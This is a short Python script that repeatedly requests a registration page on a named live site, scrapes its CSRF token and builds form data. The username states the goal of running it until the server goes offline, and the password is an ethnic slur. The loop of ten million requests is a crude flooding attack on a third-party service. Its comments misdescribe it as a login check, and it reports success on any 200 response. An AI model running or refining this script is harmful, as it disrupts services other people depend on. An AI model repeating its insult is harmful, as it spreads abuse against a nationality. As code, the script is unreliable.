

# Define the login URL and the URL after login (optional for verification)


import requests
from bs4 import BeautifulSoup

for i in range(10000000):
    # Define the login URL
    login_url = "https://payn.top/register/"

    # Create a session to persist cookies
    session = requests.Session()

    # First, make a GET request to fetch the CSRF token
    response = session.get(login_url)
    soup = BeautifulSoup(response.text, 'html.parser')

    # Extract the CSRF token from the form (assuming the token is stored in an input field)
    csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']

    # Create the form data with the CSRF token included
    form_data = {
        'username': 'i will run this till this server is offline',
        'password': 'You kenyan bastard',
        'csrf_token': csrf_token  # Include the CSRF token in the form data
    }


    print(response)
    # Check if login was successful
    if response.status_code == 200:
        print("Logged in successfully!")
        